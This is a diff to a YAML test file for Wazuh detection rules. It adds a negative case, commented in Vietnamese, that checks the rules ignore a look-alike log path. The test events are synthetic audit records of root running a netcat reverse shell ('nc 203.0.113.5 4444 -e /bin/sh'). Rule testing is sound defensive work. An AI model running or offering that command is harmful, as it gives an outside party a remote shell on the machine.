@@ -655,3 +655,10 @@
   location: /var/log/apache2/access.log
   events:
     - 'type=SYSCALL msg=audit(1767225600.101:101): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4101 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="nc" exe="/usr/bin/nc" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.101:101): argc=5 a0="nc" a1="203.0.113.5" a2="4444" a3="-e" a4="/bin/sh" type=CWD msg=audit(1767225600.101:101): cwd="/root"'
+
+# ca âm: tên file chỉ kết thúc bằng "audit.log" nhưng không phải file audit (neo (^|/))
+- none: [102501, 102511, 102503, 102504, 102506, 102516, 102590, 102505]
+  log_format: audit
+  location: /tmp/evil-audit.log
+  events:
+    - 'type=SYSCALL msg=audit(1767225600.101:101): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4101 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="nc" exe="/usr/bin/nc" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.101:101): argc=5 a0="nc" a1="203.0.113.5" a2="4444" a3="-e" a4="/bin/sh" type=CWD msg=audit(1767225600.101:101): cwd="/root"'
